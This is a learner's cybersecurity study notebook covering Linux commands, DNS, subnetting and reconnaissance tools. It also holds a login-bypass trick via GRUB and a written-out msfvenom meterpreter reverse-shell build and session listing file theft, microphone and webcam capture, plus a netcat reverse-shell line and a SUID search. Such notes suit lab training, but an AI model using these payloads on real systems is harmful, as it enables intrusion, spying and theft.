on 28th Feb 2026

**Todo - how google.com working with server**
1.our Browser first will check in cache and OS cache for google.com ip if not found 
2.Our Computer will send a request to DND(our ISP provider )will check with this 3 steps
I.Root DNS Server: The request asks a root nameserver for the location of the correct TLD server.
II.TLD DNS Server the root nameserver redirect to the appropriate TLD server (in this case, the .com TLD server).
III.Authoritative DNS Server:  which holds the official DNS records for the domain, finally provides the correct IP address for Google's server
IV.IP Address Retrieval: The authoritative nameserver, which holds the definitive DNS records for Google, returns the specific IP address (e.g., 142.250.183.110) back to the resolver, which in turn sends it to your browser.

**Todo- how to bypass kali linux login page**
1.Boot the Kali Linux and Press E button
2.Replace ro with rw and add this command at the end of line "init=/bin/bash and Press Ctrl+X"
3.use passwd code to change password

**Todo "MAN ls" all command workout**
man command means manual
1. man command name (mkdir or cd) this will show mkdir commands informations
2. use -k for search with keywords  man -k permissions
 $ man -k permission
access (2)           - check user's permissions for a file
chmod (2)            - change permissions of a file
eaccess (3)          - check effective user's permissions for a file
euidaccess (3)       - check effective user's permissions for a file
faccessat (2)        - check user's permissions for a file
faccessat2 (2)       - check user's permissions for a file
faked (1)            - daemon that remembers fake ownership/permissions of files manipulated by fakeroot processes.
faked-sysv (1)       - daemon that remembers fake ownership/permissions of files manipulated by fakeroot processes.
faked-tcp (1)        - daemon that remembers fake ownership/permissions of files manipulated by fakeroot processes.
fchmod (2)           - change permissions of a file
fchmodat (2)         - change permissions of a file
ioperm (2)           - set port input/output permissions
KEYCTL_SETPERM (2const) - change the permissions mask on a key
mariadb-setpermission (1) - interactively set permissions in grant tables (mariadb-setpermission is now a symlink to mariadb-setpermission)
WWW::RobotRules (3pm) - database of robots.txt-derived permissions
                                                                       
3. -f Displays the section number and a brief description
 man -f mkdir     
mkdir (1)            - make directories
mkdir (2)            - create a directory
4. -a Displays all available manual pages
5. -w Shows the path to the manual page file without displaying its contents.
    man -w test      
/usr/share/man/man1/test.1.gz
6. --help  all avaialble options

**General NOTES**
ddos attack - send multiple request to server to increase traffic 
Node -any device on a network (pc,printer ,router )

**Command Notes**
mv command move and rename can be done
echo "This content overwrites everything else" > filename.txt (This will permanently delete the file's original content)
echo "This is the new line of text" >> filename.txt(This command adds the string, followed by a newline character, to the end of filename.txt.)
cat source_file.txt >> destination_file.txt(This command concatenates the content of source_file.txt to the end of destination_file.txt.)
cat > newfile.txt
Hello, this is the first line.
This is the second line.
<Press Ctrl + D here> this will Overwrite

cat >> existingfile.txt
This line will be added to the end.
<Press Ctrl + D here>

file permission rwx -read,write and execute
**Commands Learned**
1.ls -Displays files and folders in a directory.List
2.pwd-Shows the full path of the current directory. print working directory
3.mkdir -Creates new folders in the file system. make directory
4.cd-Allows navigation between directories. change directories
5.rmdir-Removes directories that do not contain files. remove directories
6.cp-Copies files from one location to another. copy
7.mv-Renames files easily and Moves files between directories.Move
8.rm-Removes unwanted files.remove
9.uname -Shows operating system details.
10.locate-Searches files quickly.
11.touch-Creates new files instantly. cant edit
12.cat-read file its shows in terminal .Concatenate   cat > for overwrite and >> for append enter then type new content 
13.cat file1 file2 > new_file command for merge files
14.clear-clean terminal outputs
15.ps- show active processes
16.echo-print message in terminal and write text into files
17.cal-calender
18.whereis-show binary path
19.man-Explains options and usage.manual
20.nano-create file and edit 
alternative nano 
1.less filename  will show page by page
2.tail -10 filename will show footer 10 lines of code
3.head -10 filename this will show header 10 lines of code

4.echo "this is a new line" >>filename.txt
5.find /home/midhun -name phase
6.To search from your current directory:
bash
find . -name "filename.txt"
7.To search the entire system:
bash
find / -name "filename.txt" 2>/dev/null
8.To perform a case-insensitive search:
bash
find / -iname "filename.txt" 2>/dev/null
9.─# locate newjust.txt                                                                                                                                                      if not showing then  sudo updatedb
10.Who (u, g, o, a) 	Operator (+, -, =)	Permissions (r, w, x)
u: user (owner)    	+: add permission	              r: read
g: group           	-: remove permission	           w: write
o: others            	=: set exact permission       	x: execute
a: all (u, g, o)
Numeric Values for Permissions 
Each permission type has a numerical value: 
Read (r): 4
Write (w): 2
Execute (x): 1
No permission (-): 0
chmod 477 newjust.txt

10.to check permission ls -l
11. ps aux show all process files include system file
12. -uname -a system onfo
13.ip a alternative for ifconfig
14.rmdir -r force delete
15.whoami 

**todo locate find whereis difference?**
**todo linux hierarchy**

Windows command
1.notepad filename
2.type joshy.txt to open file
3.rmdir /s force delete if inside folder
4.tasklist task manager
5.taskkill \IM Chrome.exe /f
6.cls
7.curl google.com or parrot.live show website information


note-tails os live boot only
Ahmia website
openclaw ai
picoCTF - CMU Cybersecurity Competition  try this website
Zphisher
Camphish

**Note todo osi explanation**
packets and frame 

time to live
checksum
source address
destinaltiona address
**learn osi nd tcp ip very well**

learn protocol and port number

nat and port forwarding

oswp
firewall stateless and stateful dpa learn

Bot net infected computer learn for ddos attack
ARP
rip ospf router protocol
hop count
nptl  

nslookup -type=A google.com get only ipv4 only
nslookup -type=Aaaa google.com get only ipv only
nslookup -type=mx google.com get to get private domain mail server details
smtp and pop
nslookup -type=txt google.com 
arbitary code 
nslookup -type=ptr ip address
backdoor malcious software
 recon-ng
 ctf on april 17defcon  


**reconnaisance tools**
**todo some modules recon-ng and other tools todo**

 recon-ng
 nslookup is older and dig is newer
 dnsenum code 


 **todo records like a, cname, other **
 
 Creates a new workspace
 [recon-ng][default] > workspaces create Hacker
[recon-ng][Hacker] > marketplace search hacker

[recon-ng][Hacker] > marketplace install recon/domains-hosts/hackertarget 
[*] Module installed: recon/domains-hosts/hackertarget
[*] Reloading modules...
[recon-ng][Hacker] > ls
[!] Invalid command: ls.
[recon-ng][Hacker] > modules
Interfaces with installed modules

Usage: modules <load|reload|search> [...]

[recon-ng][Hacker] > modules load econ/domains-hosts/hackertarget 
[recon-ng][Hacker][hackertarget] > 
modules search to 
[recon-ng][Hacker][hackertarget] > modules search

  Recon
  -----
    recon/domains-hosts/hackertarget

[recon-ng][Hacker][hackertarget] > modules load recon/domains-hosts/hackertarget
[recon-ng][Hacker][hackertarget] > 
[recon-ng][Hacker][hackertarget] > options set source h4cker.org
SOURCE => h4cker.org
[recon-ng][Hacker][hackertarget] > run
[recon-ng][Hacker][hackertarget] > back
[recon-ng][Hacker] > 

netdiscover
-----------
netdiscover -r 192.168.0.1/24

arp -a not perfect

flink mobile app


dnsrecon -d example.com -D /usr/share/wordlists/subdomains.txt -t brt

**todo  A

AAAA

CNAME

MX

NS

TXT

PTR**  and 

theharvester -d example.com -b google     explanation
whois google.com and whoislookup in website with gui
 whois -h whois.arin.net 8.8.8.8
1.netcraft website to find all details
2.osintframework.com
3.whatsmyname.com
haveibeenpwned.com to check we hacked
cladai
************************************
FInd firewall present on web site to check wafw00f
osi model application layer -firewall
dmitry command
nikto command (cve org)
lbd to check load balancer
perl ldb.pl google.com
**try all ldb command**
**todo metaspoilatable 2 and burbsuite insatll**
nmap same result like angryip scanner

systemctl enable ssh enable ssh
sudo systemctl start ssh

**note-true positive,true negative,false positive,false negative**
readnotify to check mail received to client 
**hsts alternative for http**
wappalizer tool g extension
**install autopsy**
viewdns.info
sherlock command check same like whatsmyname
msfvenom -p windows/meterpreter/reverse_tcp LHOST=youripaddress LPORT=ANYPORT -f exe -0 filename
┌──(root㉿kali)-[/home/midhun]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.147 LPORT=4444 -f exe -o midhun.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: midhun.exe
                                                                                           
┌──(root㉿kali)-[/home/midhun]
└─# msfconsole
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > 
msf exploit(multi/handler) > set LHOST 192.168.0.147
LHOST => 192.168.0.147
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
meterpreter > screenshot
Screenshot saved to: /home/midhun/SPExtCdh.jpeg
commands
-------
background
ps
download secret.txt
screenshot
upload file.txt
cd /home
ls
getuid
sysinfo
execute -f cmd.exe
kill PID
record_mic
webcam_snap
cd foldername




file share from windows to kali and viceversa
1.python3 -m http.server 8000 --bind 192.168.1.5

2.Enable SSH on Kali: sudo systemctl start ssh.
Find IP: Run ip addr or ifconfig in Kali.
Copy from Windows (PowerShell/CMD):
scp C:\path\to\file.txt kali@<kali_ip>:/home/kali/Desktop
Enter the Kali password (default is usually kali). 



cryptography


semmetric


asysemmatric
rsa 
ecc

┌──(midhun㉿kali)-[~]
└─$ ipcalc 10.250.213.96
Address:   10.250.213.96        00001010.11111010.11010101. 01100000
Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
=>
Network:   10.250.213.0/24      00001010.11111010.11010101. 00000000
HostMin:   10.250.213.1         00001010.11111010.11010101. 00000001
HostMax:   10.250.213.254       00001010.11111010.11010101. 11111110
Broadcast: 10.250.213.255       00001010.11111010.11010101. 11111111
Hosts/Net: 254                   Class A, Private Internet

                                                             
binary conversion 
240.172.1.90
11110000.10101100.00000001.01011010

10.250.213.96
00001010.11111010.11010101.01100000


128         64           32          16            8         4           2            1

XOR

data 8
key 6

1000
0110

XOR1110  = 14

1110
0110

XOR decrypt 0110 =6

hydra johnripper hashcat ->password crack
netacad ethicalhacking course free
scapy adv networking


pnpt pjpt praticial certifcation 

nc -e /bin/bash 192.168.0. 4444
for another pc command for listen 
nc -lvnp

foxyproxy kali extension
massscan  linux
┌──(midhun㉿kali)-[~]
└─$ sudo masscan 192.168.0.151 -p80
[sudo] password for midhun: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-03-15 10:30:23 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [1 port/host]
apt dvwa to install metaspoliton linux
nc command (netcat on kali)

beef -xss
sudo apt install zaproxy


gobuster for find directory on website
cve.org mitre.com website and 

bypass suid
find / -perm -4000 2>/dev/null
/opt$ service --status-all | grep "+"
apparmour
chmod +s mean suid root access
service --status-all |grep "*"

bash or ./ both can use to run sh or some or=ther file
nbtstat windows for enumeration and for kali nmblookup

     






   










 











